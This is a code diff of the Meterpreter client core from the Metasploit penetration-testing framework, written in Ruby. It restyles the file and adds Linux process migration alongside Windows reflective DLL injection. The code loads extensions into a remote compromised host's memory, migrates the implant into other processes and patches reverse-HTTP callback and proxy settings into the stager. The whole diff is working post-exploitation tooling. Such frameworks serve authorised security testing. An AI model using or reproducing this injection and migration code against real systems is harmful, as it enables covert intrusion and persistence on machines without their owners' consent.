@@ -1,10 +1,15 @@
-#!/usr/bin/env ruby
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/packet'
 require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/client'
+
+# Used to generate a reflective DLL when migrating. This is yet another
+# argument for moving the meterpreter client into the Msf namespace.
 require 'msf/core/payload/windows'
+
+# Provides methods to patch options into the metsrv stager.
+require 'rex/payloads/meterpreter/patch'
 
 module Rex
 module Post
@@ -20,315 +25,427 @@ module Meterpreter
 ###
 class ClientCore < Extension
 
-	#
-	# Initializes the 'core' portion of the meterpreter client commands.
-	#
-	def initialize(client)
-		super(client, "core")
-	end
+  UNIX_PATH_MAX = 108
+  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
 
-	##
-	#
-	# Core commands
-	#
-	##
+  #
+  # Initializes the 'core' portion of the meterpreter client commands.
+  #
+  def initialize(client)
+    super(client, "core")
+  end
 
-	#
-	# Loads a library on the remote meterpreter instance.  This method
-	# supports loading both extension and non-extension libraries and
-	# also supports loading libraries from memory or disk depending
-	# on the flags that are specified
-	#
-	# Supported flags:
-	#
-	#	LibraryFilePath
-	#		The path to the library that is to be loaded
-	#
-	#	TargetFilePath
-	#		The target library path when uploading
-	#
-	#	UploadLibrary
-	#		Indicates whether or not the library should be uploaded
-	#
-	#	SaveToDisk
-	#		Indicates whether or not the library should be saved to disk
-	#		on the remote machine
-	#
-	#	Extension
-	#		Indicates whether or not the library is a meterpreter extension
-	#
-	def load_library(opts)
-		library_path = opts['LibraryFilePath']
-		target_path  = opts['TargetFilePath']
-		load_flags   = LOAD_LIBRARY_FLAG_LOCAL
+  ##
+  #
+  # Core commands
+  #
+  ##
 
-		# No library path, no cookie.
-		if (library_path == nil)
-			raise ArgumentError, "No library file path was supplied", caller
-		end
+  #
+  # Loads a library on the remote meterpreter instance.  This method
+  # supports loading both extension and non-extension libraries and
+  # also supports loading libraries from memory or disk depending
+  # on the flags that are specified
+  #
+  # Supported flags:
+  #
+  #	LibraryFilePath
+  #		The path to the library that is to be loaded
+  #
+  #	TargetFilePath
+  #		The target library path when uploading
+  #
+  #	UploadLibrary
+  #		Indicates whether or not the library should be uploaded
+  #
+  #	SaveToDisk
+  #		Indicates whether or not the library should be saved to disk
+  #		on the remote machine
+  #
+  #	Extension
+  #		Indicates whether or not the library is a meterpreter extension
+  #
+  def load_library(opts)
+    library_path = opts['LibraryFilePath']
+    target_path  = opts['TargetFilePath']
+    load_flags   = LOAD_LIBRARY_FLAG_LOCAL
 
-		# Set up the proper loading flags
-		if (opts['UploadLibrary'])
-			load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
-		end
-		if (opts['SaveToDisk'])
-			load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
-		end
-		if (opts['Extension'])
-			load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
-		end
+    # No library path, no cookie.
+    if library_path.nil?
+      raise ArgumentError, "No library file path was supplied", caller
+    end
 
-		# Create a request packet
-		request = Packet.create_request('core_loadlib')
+    # Set up the proper loading flags
+    if opts['UploadLibrary']
+      load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
+    end
+    if opts['SaveToDisk']
+      load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
+    end
+    if opts['Extension']
+      load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
+    end
 
-		# If we must upload the library, do so now
-		if ((load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL)
-			image = ''
+    # Create a request packet
+    request = Packet.create_request('core_loadlib')
 
-			::File.open(library_path, 'rb') { |f|
-				image = f.read
-			}
+    # If we must upload the library, do so now
+    if (load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL
+      image = ''
 
-			if (image != nil)
-				request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
-			else
-				raise RuntimeError, "Failed to serialize library #{library_path}.", caller
-			end
+      ::File.open(library_path, 'rb') { |f|
+        image = f.read
+      }
 
-			# If it's an extension we're dealing with, rename the library
-			# path of the local and target so that it gets loaded with a random
-			# name
-			if (opts['Extension'])
-				library_path = "ext" + rand(1000000).to_s + ".#{client.binary_suffix}"
-				target_path  = library_path
-			end
-		end
+      if !image.nil?
+        request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
+      else
+        raise RuntimeError, "Failed to serialize library #{library_path}.", caller
+      end
 
-		# Add the base TLVs
-		request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
-		request.add_tlv(TLV_TYPE_FLAGS, load_flags)
+      # If it's an extension we're dealing with, rename the library
+      # path of the local and target so that it gets loaded with a random
+      # name
+      if opts['Extension']
+        library_path = "ext" + rand(1000000).to_s + ".#{client.binary_suffix}"
+        target_path  = library_path
+      end
+    end
 
-		if (target_path != nil)
-			request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
-		end
+    # Add the base TLVs
+    request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
+    request.add_tlv(TLV_TYPE_FLAGS, load_flags)
 
-		# Transmit the request and wait the default timeout seconds for a response
-		response = self.client.send_packet_wait_response(request, self.client.response_timeout)
+    if !target_path.nil?
+      request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
+    end
 
-		# No response?
-		if (response == nil)
-			raise RuntimeError, "No response was received to the core_loadlib request.", caller
-		elsif (response.result != 0)
-			raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
-		end
+    # Transmit the request and wait the default timeout seconds for a response
+    response = self.client.send_packet_wait_response(request, self.client.response_timeout)
 
-		commands = []
-		response.each(TLV_TYPE_METHOD) { |c|
-			commands << c.value
-		}
+    # No response?
+    if response.nil?
+      raise RuntimeError, "No response was received to the core_loadlib request.", caller
+    elsif response.result != 0
+      raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
+    end
 
-		return commands
-	end
+    commands = []
+    response.each(TLV_TYPE_METHOD) { |c|
+      commands << c.value
+    }
 
-	#
-	# Loads a meterpreter extension on the remote server instance and
-	# initializes the client-side extension handlers
-	#
-	#	Module
-	#		The module that should be loaded
-	#
-	#	LoadFromDisk
-	#		Indicates that the library should be loaded from disk, not from
-	#		memory on the remote machine
-	#
-	def use(mod, opts = { })
-		if (mod == nil)
-			raise RuntimeError, "No modules were specified", caller
-		end
-		# Get us to the installation root and then into data/meterpreter, where
-		# the file is expected to be
-		path = ::File.join(Msf::Config.install_root, 'data', 'meterpreter', 'ext_server_' + mod.downcase + ".#{client.binary_suffix}")
+    return commands
+  end
 
-		if (opts['ExtensionPath'])
-			path = opts['ExtensionPath']
-		end
+  #
+  # Loads a meterpreter extension on the remote server instance and
+  # initializes the client-side extension handlers
+  #
+  #	Module
+  #		The module that should be loaded
+  #
+  #	LoadFromDisk
+  #		Indicates that the library should be loaded from disk, not from
+  #		memory on the remote machine
+  #
+  def use(mod, opts = { })
+    if mod.nil?
+      raise RuntimeError, "No modules were specified", caller
+    end
+    # Get us to the installation root and then into data/meterpreter, where
+    # the file is expected to be
+    modname = "ext_server_#{mod.downcase}"
+    path = MeterpreterBinaries.path(modname, client.binary_suffix)
 
-		path = ::File.expand_path(path)
+    if opts['ExtensionPath']
+      path = ::File.expand_path(opts['ExtensionPath'])
+    end
 
-		# Load the extension DLL
-		commands = load_library(
-				'LibraryFilePath' => path,
-				'UploadLibrary'   => true,
-				'Extension'       => true,
-				'SaveToDisk'      => opts['LoadFromDisk'])
-		client.add_extension(mod, commands)
+    if path.nil?
+      raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
+    end
 
-		return true
-	end
+    # Load the extension DLL
+    commands = load_library(
+        'LibraryFilePath' => path,
+        'UploadLibrary'   => true,
+        'Extension'       => true,
+        'SaveToDisk'      => opts['LoadFromDisk'])
+    client.add_extension(mod, commands)
 
-	#
-	# Migrates the meterpreter instance to the process specified
-	# by pid.  The connection to the server remains established.
-	#
-	def migrate( pid )
-		keepalive = client.send_keepalives
-		client.send_keepalives = false
-		process       = nil
-		binary_suffix = nil
+    return true
+  end
 
-		# Load in the stdapi extension if not allready present so we can determine the target pid architecture...
-		client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
+  #
+  # Migrates the meterpreter instance to the process specified
+  # by pid.  The connection to the server remains established.
+  #
+  def migrate(pid, writable_dir = nil)
+    keepalive = client.send_keepalives
+    client.send_keepalives = false
+    process       = nil
+    binary_suffix = nil
+    old_platform      = client.platform
+    old_binary_suffix = client.binary_suffix
 
-		# Determine the architecture for the pid we are going to migrate into...
-		client.sys.process.processes.each { | p |
-			if( p['pid'] == pid )
-				process = p
-				break
-			end
-		}
+    # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
+    client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
 
-		# We cant migrate into a process that does not exist.
-		if( process == nil )
-			raise RuntimeError, "Cannot migrate into non existent process", caller
-		end
+    # Determine the architecture for the pid we are going to migrate into...
+    client.sys.process.processes.each { | p |
+      if p['pid'] == pid
+        process = p
+        break
+      end
+    }
 
-		# We cant migrate into a process that we are unable to open
-		if( process['arch'] == nil or process['arch'].empty? )
-			raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
-		end
+    # We cant migrate into a process that does not exist.
+    if process.nil?
+      raise RuntimeError, "Cannot migrate into non existent process", caller
+    end
 
-		# And we also cant migrate into our own current process...
-		if( process['pid'] == client.sys.process.getpid )
-			raise RuntimeError, "Cannot migrate into current process", caller
-		end
+    # We cannot migrate into a process that we are unable to open
+    # On linux, arch is empty even if we can access the process
+    if client.platform =~ /win/
+      if process['arch'] == nil || process['arch'].empty?
+        raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
+      end
+    end
 
-		# Create a new payload stub
-		c = Class.new( ::Msf::Payload )
-		c.include( ::Msf::Payload::Stager )
+    # And we also cannot migrate into our own current process...
+    if process['pid'] == client.sys.process.getpid
+      raise RuntimeError, "Cannot migrate into current process", caller
+    end
 
-		# Include the appropriate reflective dll injection module for the target process architecture...
-		if( process['arch'] == ARCH_X86 )
-			c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
-			binary_suffix = "dll"
-		elsif( process['arch'] == ARCH_X86_64 )
-			c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
-			binary_suffix = "x64.dll"
-		else
-			raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
-		end
+    if client.platform =~ /linux/
+      if writable_dir.blank?
+        writable_dir = tmp_folder
+      end
 
-		# Create the migrate stager
-		migrate_stager = c.new()
-		migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.#{binary_suffix}" )
+      stat_dir = client.fs.filestat.new(writable_dir)
 
-		blob = migrate_stager.stage_payload
+      unless stat_dir.directory?
+        raise RuntimeError, "Directory #{writable_dir} not found", caller
+      end
+      # Rex::Post::FileStat#writable? isn't available
+    end
 
-		if client.passive_service
+    blob = generate_payload_stub(process)
 
-			# Replace the transport string first (TRANSPORT_SOCKET_SSL
-			i = blob.index("METERPRETER_TRANSPORT_SSL")
-			if i
-				str = client.ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
-				blob[i, str.length] = str
-			end
+    # Build the migration request
+    request = Packet.create_request( 'core_migrate' )
 
-			conn_id = self.client.conn_id
-			i = blob.index("https://" + ("X" * 256))
-			if i
-				str = self.client.url
-				blob[i, str.length] = str
-			end
+    if client.platform =~ /linux/i
+      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
 
-			i = blob.index([0xb64be661].pack("V"))
-			if i
-				str = [ self.client.expiration ].pack("V")
-				blob[i, str.length] = str
-			end
+      if socket_path.length > UNIX_PATH_MAX - 1
+        raise RuntimeError, "The writable dir is too long", caller
+      end
 
-			i = blob.index([0xaf79257f].pack("V"))
-			if i
-				str = [ self.client.comm_timeout ].pack("V")
-				blob[i, str.length] = str
-			end
-		end
+      pos = blob.index(DEFAULT_SOCK_PATH)
 
-		# Build the migration request
-		request = Packet.create_request( 'core_migrate' )
-		request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-		request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
-		request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
-		if( process['arch'] == ARCH_X86_64 )
-			request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
-		else
-			request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
-		end
+      if pos.nil?
+        raise RuntimeError, "The meterpreter binary is wrong", caller
+      end
 
-		# Send the migration request (bump up the timeout to 60 seconds)
-		response = client.send_request( request, 60 )
+      blob[pos, socket_path.length + 1] = socket_path + "\x00"
 
-		if client.passive_service
-			# Sleep for 5 seconds to allow the full handoff, this prevents
-			# the original process from stealing our loadlib requests
-			::IO.select(nil, nil, nil, 5.0)
-		else
-			# Prevent new commands from being sent while we finish migrating
-			client.comm_mutex.synchronize do
-				# Disable the socket request monitor
-				client.monitor_stop
+      ep = elf_ep(blob)
+      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
+      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
+      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
+    end
 
-				###
-				# Now communicating with the new process
-				###
+    request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
+    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
+    if process['arch'] == ARCH_X86_64
+      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
+    else
+      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
+    end
 
-				# Renegotiate SSL over this socket
-				client.swap_sock_ssl_to_plain()
-				client.swap_sock_plain_to_ssl()
+    # Send the migration request (bump up the timeout to 60 seconds)
+    client.send_request( request, 60 )
 
-				# Restart the socket monitor
-				client.monitor_socket
-			end
-		end
+    if client.passive_service
+      # Sleep for 5 seconds to allow the full handoff, this prevents
+      # the original process from stealing our loadlib requests
+      ::IO.select(nil, nil, nil, 5.0)
+    else
+      # Prevent new commands from being sent while we finish migrating
+      client.comm_mutex.synchronize do
+        # Disable the socket request monitor
+        client.monitor_stop
 
-		# Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
-		# sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
-		# If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
-		if( process['arch'] == ARCH_X86_64 )
-			client.platform      = 'x64/win64'
-			client.binary_suffix = 'x64.dll'
-		else
-			client.platform      = 'x86/win32'
-			client.binary_suffix = 'dll'
-		end
+        ###
+        # Now communicating with the new process
+        ###
 
-		# Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
-		client.ext.aliases.keys.each { |e|
-			client.core.use(e)
-		}
+        # If renegotiation takes longer than a minute, it's a pretty
+        # good bet that migration failed and the remote side is hung.
+        # Since we have the comm_mutex here, we *must* release it to
+        # keep from hanging the packet dispatcher thread, which results
+        # in blocking the entire process.
+        begin
+          Timeout.timeout(60) do
+            # Renegotiate SSL over this socket
+            client.swap_sock_ssl_to_plain()
+            client.swap_sock_plain_to_ssl()
+          end
+        rescue TimeoutError
+          client.alive = false
+          return false
+        end
 
-		# Restore session keep-alives
-		client.send_keepalives = keepalive
+        # Restart the socket monitor
+        client.monitor_socket
 
-		return true
-	end
+      end
+    end
 
-	#
-	# Shuts the session down
-	#
-	def shutdown
-		request  = Packet.create_request('core_shutdown')
+    # Update the meterpreter platform/suffix for loading extensions as we may
+    # have changed target architecture
+    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a
+    # module this is the simplest solution I could think of. If the platform
+    # specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change
+    # significantly we will need a better way to do this.
 
-		# If this is a standard TCP session, send and return
-		if not client.passive_service
-			self.client.send_packet(request)
-		else
-		# If this is a HTTP/HTTPS session we need to wait a few seconds
-		# otherwise the session may not receive the command before we
-		# kill the handler. This could be improved by the server side
-		# sending a reply to shutdown first.
-			self.client.send_packet_wait_response(request, 10)
-		end
-		true
-	end
+    case client.platform
+    when /win/i
+      if process['arch'] == ARCH_X86_64
+        client.platform      = 'x64/win64'
+        client.binary_suffix = 'x64.dll'
+      else
+        client.platform      = 'x86/win32'
+        client.binary_suffix = 'x86.dll'
+      end
+    when /linux/i
+      client.platform        = 'x86/linux'
+      client.binary_suffix   = 'lso'
+    else
+      client.platform        = old_platform
+      client.binary_suffix   = old_binary_suffix
+    end
+
+    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
+    client.ext.aliases.keys.each { |e|
+      client.core.use(e)
+    }
+
+    # Restore session keep-alives
+    client.send_keepalives = keepalive
+
+    return true
+  end
+
+  #
+  # Shuts the session down
+  #
+  def shutdown
+    request  = Packet.create_request('core_shutdown')
+
+    # If this is a standard TCP session, send and return
+    if not client.passive_service
+      self.client.send_packet(request)
+    else
+    # If this is a HTTP/HTTPS session we need to wait a few seconds
+    # otherwise the session may not receive the command before we
+    # kill the handler. This could be improved by the server side
+    # sending a reply to shutdown first.
+      self.client.send_packet_wait_response(request, 10)
+    end
+    true
+  end
+
+  private
+
+  def generate_payload_stub(process)
+    case client.platform
+    when /win/i
+      blob = generate_windows_stub(process)
+    when /linux/i
+      blob = generate_linux_stub
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
+    end
+
+    blob
+  end
+
+  def generate_windows_stub(process)
+    c = Class.new( ::Msf::Payload )
+    c.include( ::Msf::Payload::Stager )
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if process['arch'] == ARCH_X86
+      c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
+      binary_suffix = "x86.dll"
+    elsif process['arch'] == ARCH_X86_64
+      c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
+      binary_suffix = "x64.dll"
+    else
+      raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
+    end
+
+    # Create the migrate stager
+    migrate_stager = c.new()
+
+    dll = MeterpreterBinaries.path('metsrv',binary_suffix)
+    if dll.nil?
+      raise RuntimeError, "metsrv.#{binary_suffix} not found", caller
+    end
+    migrate_stager.datastore['DLL'] = dll
+
+    blob = migrate_stager.stage_payload
+
+    if client.passive_service
+
+      #
+      # Patch options into metsrv for reverse HTTP payloads
+      #
+      Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
+        :ssl            =>  client.ssl,
+        :url            =>  self.client.url,
+        :expiration     => self.client.expiration,
+        :comm_timeout   =>  self.client.comm_timeout,
+        :ua             =>  client.exploit_datastore['MeterpreterUserAgent'],
+        :proxyhost      =>  client.exploit_datastore['PROXYHOST'],
+        :proxyport      =>  client.exploit_datastore['PROXYPORT'],
+        :proxy_type     =>  client.exploit_datastore['PROXY_TYPE'],
+        :proxy_username =>  client.exploit_datastore['PROXY_USERNAME'],
+        :proxy_password =>  client.exploit_datastore['PROXY_PASSWORD']
+
+    end
+
+    blob
+  end
+
+  def generate_linux_stub
+    file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
+    blob = ::File.open(file, "rb") {|f|
+      f.read(f.stat.size)
+    }
+
+    blob
+  end
+
+  def elf_ep(payload)
+    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+    ep = elf.elf_header.e_entry
+    return ep
+  end
+
+  def tmp_folder
+    tmp = client.sys.config.getenv('TMPDIR')
+
+    if tmp.blank?
+      tmp = '/tmp'
+    end
+
+    tmp
+  end
 
 end
 
